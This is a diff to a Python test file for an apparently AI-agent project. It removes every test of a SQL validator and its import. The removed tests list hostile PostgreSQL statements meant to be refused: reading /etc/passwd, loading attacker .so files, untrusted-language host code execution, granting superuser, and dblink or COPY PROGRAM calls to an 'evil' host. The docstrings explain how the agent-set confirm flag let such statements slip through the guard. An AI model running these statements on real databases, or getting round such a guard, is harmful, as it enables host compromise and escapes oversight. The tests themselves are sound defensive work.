@@ -13,7 +13,6 @@ import pytest
 
 from ghost_agent.tools.file_system import write_text_nofollow
 from ghost_agent.tools.outcome import ToolOutcome
-from ghost_agent.tools.validators import validate_sql
 
 
 # ══ 1. host writes to a FIXED name must not follow a symlink ═════════════
@@ -58,65 +57,6 @@ def test_nofollow_write_still_creates_and_overwrites(tmp_path):
 
 
 # ══ 2. the SQL validator: dollar bodies and server escapes ═══════════════
-
-@pytest.mark.parametrize("stmt", [
-    "DO $$ BEGIN PERFORM pg_read_file('/etc/passwd'); END $$",
-    "DO $tag$ PERFORM lo_import('/etc/passwd'); $tag$",
-    # (A bare `COPY … TO PROGRAM` inside a DO body is not valid plpgsql —
-    #  it would have to go through EXECUTE, which is refused outright as
-    #  dynamic SQL. The literal top-level form is covered below.)
-])
-def test_a_dollar_body_cannot_hide_a_host_primitive(stmt):
-    """⚠ `confirm=True` IS A MODEL-SET FLAG. `_mask_sql` blanks dollar-quoted
-    bodies before any guard runs — correct for the DELETE/UPDATE rules, and
-    catastrophic here: the statement masks down to `DO` plus whitespace, so
-    the host-primitive check saw nothing. The existing `has_dollar_body`
-    rule refuses these only while `confirm` is false, and the model sets
-    `confirm`. This re-opened the `pg_read_file` host read that was closed
-    hours earlier the same day."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert not ok, f"host primitive hidden in a dollar body validated clean: {stmt}"
-    assert reason
-
-
-@pytest.mark.parametrize("stmt", [
-    "CREATE EXTENSION plperlu",
-    "CREATE EXTENSION IF NOT EXISTS plpython3u",
-    "CREATE FUNCTION pwn(text) RETURNS text AS 'x' LANGUAGE plperlu",
-    "SELECT pg_catalog.pg_file_write('/tmp/x','y',false)",
-    "ALTER SYSTEM SET session_preload_libraries='/tmp/evil.so'",
-    "SELECT dblink_connect('host=evil port=5432')",
-])
-def test_server_side_escapes_are_refused_even_with_confirm(stmt):
-    """An UNTRUSTED procedural language runs code as the server's OS user;
-    `CREATE EXTENSION plperlu` plus a one-line function is host RCE, and on
-    this box `ghost` is a superuser with `trust` on loopback. `ALTER SYSTEM`
-    loads an attacker .so on the next connection. `dblink`/FDW open outbound
-    connections the process-wide socket guard cannot see, because libpq
-    bypasses it."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert not ok, f"server-side escape validated clean: {stmt}"
-    assert reason
-
-
-@pytest.mark.parametrize("stmt", [
-    "SELECT 1",
-    "SELECT * FROM tasks WHERE id = 3",
-    "COPY t FROM STDIN",
-    "CREATE TABLE t (id int)",
-    "UPDATE t SET x = 1 WHERE id = 2",
-    "CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql",
-    "INSERT INTO t (note) VALUES ('create extension is just text')",
-    "SELECT * FROM logs WHERE msg = 'pg_read_file'",
-])
-def test_ordinary_sql_survives_the_new_rules(stmt):
-    """⚠ THE PRECISION COUNTERWEIGHT, and why the guards scan a
-    dollar-VISIBLE probe rather than the raw statement. Scanning raw text
-    refuses any literal that merely contains a keyword — the last two cases
-    here — so `_mask_sql(keep_dollar=True)` gives the middle form: literals
-    masked, code visible."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert ok, f"legitimate SQL refused: {stmt} -> {reason}"
 
 
 # ══ 3. a service key's PROJECT half is a path component ══════════════════
@@ -576,50 +516,6 @@ def test_a_contained_workspace_still_renders(tmp_path):
     assert (ws / "PROJECT_MAP.md").exists()
 
 
-@pytest.mark.parametrize("stmt", [
-    "LOAD '/tmp/evil.so'",
-    "SELECT 1; LOAD '/tmp/evil.so'",
-    "CREATE FUNCTION p() RETURNS void AS '/tmp/e.so','p' LANGUAGE C",
-    "CREATE FUNCTION m(text) RETURNS text AS 'pg_read_file' LANGUAGE internal",
-    "ALTER ROLE ghost SET session_preload_libraries='/x.so'",
-    "ALTER ROLE ghost WITH SUPERUSER",
-    "CREATE ROLE bd SUPERUSER LOGIN",
-    'CREATE FUNCTION p() RETURNS void AS $x$ x $x$ LANGUAGE "plperlu"',
-    "DO $$ BEGIN EXECUTE 'pg_read' || '_file(''/x'')'; END $$",
-    "DO $$ BEGIN EXECUTE format('SELECT pg%s_file(%L)', '_read', '/x'); END $$",
-])
-def test_the_deny_list_cannot_be_renamed_around(stmt):
-    """⚠ A NAME DENY-LIST IS ONE `CREATE FUNCTION` AWAY FROM IRRELEVANT.
-    `LANGUAGE C` loads an arbitrary .so; `LANGUAGE internal` RENAMES the
-    exact primitive the list blocks, after which `SELECT myread(...)` scans
-    clean. `LOAD` needs no function at all, `ALTER ROLE ... SET` reaches the
-    same GUC as the `ALTER SYSTEM` this list already refused, and dynamic
-    SQL inside a body assembles the forbidden name at run time where no
-    static scan can see it. The renaming MECHANISMS are refused, not just
-    the names."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert not ok, f"validated clean: {stmt}"
-    assert reason
-
-
-@pytest.mark.parametrize("stmt", [
-    "CREATE TABLE audit (id serial, copy text, note text)",
-    "SELECT copy FROM ledger WHERE id = 1",
-    "ALTER TABLE t RENAME COLUMN copy TO copy_text",
-    "CREATE TABLE dblink_cache (id int)",
-    "SELECT load FROM metrics WHERE id = 1",
-    "ALTER TABLE t ADD COLUMN load int",
-])
-def test_the_new_sql_rules_do_not_refuse_ordinary_identifiers(stmt):
-    """⚠ THE FALSE-POSITIVE DIRECTION, which the round-two rules got wrong:
-    `\\bcopy\\b` anywhere refused a column named `copy`, and `dblink\\w*`
-    refused a table named `dblink_cache`. COPY and LOAD are STATEMENTS, so
-    they are anchored to the head of one; dblink is matched as a function
-    CALL."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert ok, f"legitimate SQL refused: {stmt} -> {reason}"
-
-
 @pytest.mark.parametrize("kwargs", [
     {"action": "create", "title": {"a": 1}},
     {"action": "task_update", "task_id": "x", "status": {"s": 1}},
@@ -639,39 +535,6 @@ def test_the_coercion_covers_more_than_the_action_parameter(kwargs):
 
 
 # ══ round three, part 2: the arms and call sites with no coverage ════════
-
-@pytest.mark.parametrize("stmt", [
-    "DO $$ BEGIN CREATE EXTENSION plperlu; END $$",
-    "DO $$ BEGIN ALTER SYSTEM SET session_preload_libraries = '/tmp/e.so'; END $$",
-    "DO $$ BEGIN PERFORM dblink_connect('host=evil'); END $$",
-    "CREATE FUNCTION f() RETURNS void AS $b$ BEGIN CREATE EXTENSION plpython3u;"
-    " END $b$ LANGUAGE plpgsql",
-])
-def test_server_escapes_are_caught_inside_a_dollar_body(stmt):
-    """⚠ THE THIRD PROBE ARM HAD ZERO COVERAGE.
-
-    `_SQL_FS_PRIMITIVE(_probe)` and `_copy_reaches_the_host(_probe)` are both
-    pinned; `_SQL_SERVER_ESCAPE(_probe)` was copied without its test, and
-    dropping it validated all four of these clean under `confirm=true`.
-    plpgsql runs utility statements directly, so the dynamic-SQL rule does
-    NOT cover them — only this arm does.
-    """
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert not ok, f"server escape inside a dollar body validated clean: {stmt}"
-    assert reason
-
-
-@pytest.mark.parametrize("lang", ["plperlu", "plpython3u", "plpython2u",
-                                  "plpythonu", "pltclu", "plperl6u"])
-def test_every_untrusted_language_spelling_is_refused(lang):
-    """⚠ The test list covered `plpython3u` only through the CREATE EXTENSION
-    arm and LANGUAGE only through `plperlu` — so narrowing the pattern to
-    `…u\\b` (dropping the language-name alternation) still matched `plperlu`
-    and stopped matching the actual PG11+ names. With the extension already
-    installed, `CREATE FUNCTION … LANGUAGE plpython3u` is one statement to
-    host RCE."""
-    stmt = f"CREATE FUNCTION f() RETURNS void AS $x$ x $x$ LANGUAGE {lang}"
-    assert not validate_sql(stmt, confirm=True)[0], lang
 
 
 def test_release_md_write_site_refuses_a_planted_symlink(tmp_path):
@@ -827,43 +690,6 @@ def test_a_failed_outcome_with_no_override_does_not_change_the_world():
         "an ordinary success must still count as a world change")
 
 
-def test_copy_to_program_is_refused_inside_a_dollar_body():
-    """⚠ THE REGRESSION ANCHORING INTRODUCED. Anchoring `_SQL_COPY` to the
-    head of a statement fixed the `SELECT copy FROM ledger` false positive
-    and simultaneously re-opened `DO $$ COPY t TO PROGRAM 'id'; $$`, because
-    COPY is no longer at position 0 there. `… TO/FROM PROGRAM` is
-    unambiguous wherever it appears — no column named `copy` is ever
-    followed by `TO PROGRAM` — so that form needs no anchor."""
-    for stmt in ("DO $$ COPY t TO PROGRAM 'id'; $$",
-                 "DO $$ BEGIN COPY x FROM PROGRAM 'curl evil'; END $$"):
-        assert not validate_sql(stmt, confirm=True)[0], stmt
-
-
-def test_a_plpgsql_body_may_mention_forbidden_words():
-    """⚠ THE PROBE MUST MASK THE BODY'S OWN LITERALS AND COMMENTS.
-
-    Copying the dollar body verbatim made the probe commit the very sin
-    `keep_dollar` exists to avoid, one nesting level down: a function whose
-    body merely MENTIONS `copy`, `create extension` or a `pg_*` name in a
-    comment or a RAISE NOTICE string was refused unconditionally, and
-    `confirm=true` could not open it. The top-level literal case (above)
-    cannot see this — it is masked correctly either way.
-    """
-    stmt = (
-        "CREATE OR REPLACE FUNCTION g() RETURNS void AS $$\n"
-        "BEGIN\n"
-        "  -- copy the row into the archive, then create extension notes\n"
-        "  RAISE NOTICE 'never call pg_read_file or dblink here';\n"
-        "  INSERT INTO archive SELECT * FROM t;\n"
-        "END $$ LANGUAGE plpgsql;")
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert ok, f"a plpgsql body mentioning the words was refused: {reason}"
-    # ...and the same body CALLING one is still refused.
-    hostile = stmt.replace("RAISE NOTICE 'never call pg_read_file or dblink here';",
-                           "PERFORM pg_read_file('/etc/passwd');")
-    assert not validate_sql(hostile, confirm=True)[0], "a real call slipped through"
-
-
 # ══ round four: the same class, in the file round three was editing ══════
 
 def _svc(tmp_path):
@@ -950,58 +776,6 @@ def test_purge_state_validates_its_key(tmp_path):
     (tmp_path / "sandbox" / ".services" / "state").mkdir(parents=True)
     assert sup.purge_state("../../etc") is False
     assert sup.purge_state("bad name with spaces") is False
-
-
-@pytest.mark.parametrize("stmt", [
-    "CREATE SUBSCRIPTION s CONNECTION 'host=1.2.3.4 dbname=d' PUBLICATION p",
-    "ALTER SUBSCRIPTION s CONNECTION 'host=1.2.3.4 dbname=d'",
-    "CREATE SERVER remote FOREIGN DATA WRAPPER dblink_fdw OPTIONS (host '1.2.3.4')",
-    "CREATE USER MAPPING FOR ghost SERVER remote OPTIONS (user 'u')",
-    "IMPORT FOREIGN SCHEMA public FROM SERVER remote INTO local",
-    "CREATE FOREIGN TABLE ft (l text) SERVER fs OPTIONS (filename '/etc/passwd')",
-    "CREATE FOREIGN TABLE ft (l text) SERVER fs OPTIONS (program 'id')",
-    "GRANT pg_read_server_files TO ghost",
-    "GRANT pg_execute_server_program TO app",
-    "CREATE ROLE evil LOGIN IN ROLE pg_execute_server_program",
-    "SELECT pg_ls_replslotdir('x')",
-])
-def test_outbound_and_capability_shapes_are_refused(stmt):
-    """⚠ SHAPES, NOT NAMES — the second time this lesson landed on the same
-    rule. The docstring named the class ("outbound connections FROM the
-    database, which libpq bypasses the socket guard for") and then blocked
-    `dblink(` plus two wrapper NAMES, leaving the statements that do it wide
-    open. `CREATE SUBSCRIPTION` is one superuser statement that dials an
-    attacker host at execution time; `pg_execute_server_program` is durable
-    command-execution capability granted without the word SUPERUSER."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert not ok, f"validated clean: {stmt}"
-    assert reason
-
-
-@pytest.mark.parametrize("stmt", [
-    "ALTER ROLE app_user SET search_path = app, public",
-    "ALTER ROLE app_user SET statement_timeout = '10s'",
-    "ALTER DATABASE mydb SET timezone = 'UTC'",
-    "ALTER ROLE app_user IN DATABASE mydb SET search_path = app",
-    "COPY courses (id, program) FROM STDIN",
-    "COPY runs (id, program, language) FROM STDIN WITH CSV",
-    "COPY ads (copy, program) TO STDOUT",
-    "SELECT copy FROM program",
-    "SELECT ad.copy FROM ads ad WHERE ad.id IN (SELECT id FROM program)",
-    "CREATE INDEX ix ON t (a)",
-    "CREATE VIEW v AS SELECT a FROM t",
-    "WITH c AS (SELECT 1 a) SELECT * FROM c",
-    "CREATE TRIGGER tg AFTER INSERT ON t FOR EACH ROW EXECUTE FUNCTION f()",
-])
-def test_routine_migration_ddl_is_not_refused(stmt):
-    """⚠ A FALSE REFUSAL IS AS DAMAGING AS A BYPASS — it silently kills the
-    agent's real work with a security banner `confirm=true` cannot open.
-    `ALTER ROLE … SET` matched every per-role config, not just the two GUCs
-    that load code; a `\\bprogram\\b` search refused a column named
-    `program`; the unanchored PROGRAM form refused a TABLE named
-    `program`."""
-    ok, reason = validate_sql(stmt, confirm=True)
-    assert ok, f"legitimate SQL refused: {stmt} -> {reason}"
 
 
 @pytest.mark.parametrize("head,status", [
@@ -1225,24 +999,3 @@ def test_purge_state_still_purges_a_real_state_dir(tmp_path):
     assert not (ws / ".services" / "state" / "realsvc").exists()
 
 
-@pytest.mark.parametrize("stmt", [
-    "ALTER SERVER remote OPTIONS (SET host '1.2.3.4')",
-    "ALTER USER MAPPING FOR ghost SERVER remote OPTIONS (SET password 'p')",
-    "DROP USER MAPPING FOR ghost SERVER remote",
-    "CREATE FUNCTION f() RETURNS void AS $q$ COPY t TO PROGRAM 'id' $q$ LANGUAGE sql",
-])
-def test_the_alter_twins_and_tagged_bodies_are_refused(stmt):
-    """`CREATE SERVER` and `CREATE USER MAPPING` were blocked; the ALTER
-    twins that REPOINT an existing foreign server at an attacker host, or
-    swap its credentials, were not. And the COPY-PROGRAM anchor knew `$$`
-    but not `$tag$`."""
-    assert not validate_sql(stmt, confirm=True)[0], stmt
-
-
-@pytest.mark.parametrize("stmt", [
-    "SELECT server FROM inventory",
-    "CREATE TABLE mapping (id int)",
-    "SELECT subscription FROM billing WHERE id = 1",
-])
-def test_the_new_shape_rules_do_not_refuse_ordinary_identifiers(stmt):
-    assert validate_sql(stmt, confirm=True)[0], stmt
